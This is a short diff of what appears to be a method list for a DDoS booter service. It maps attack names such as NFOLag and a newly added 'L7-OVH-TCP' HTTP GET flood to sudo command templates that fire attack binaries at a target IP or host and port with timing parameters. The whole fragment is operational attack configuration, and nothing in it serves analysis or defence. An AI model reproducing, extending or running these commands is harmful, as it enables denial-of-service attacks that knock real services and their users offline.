@@ -56,4 +56,6 @@ Twiks : sudo ./Twiks %ip% %port%
 
 korkut : sudo ./korkut2 %ip% %port% 10 -1 9999
 
-NFOLAGV2 : sudo ./NFOLag %ip% %port% 1025 0
+NFOLAG : sudo ./NFOLag %ip% %port% 1025 0
+
+L7-OVH-TCP : ./L7-OVH-TCP GET %host% %port% 300 120
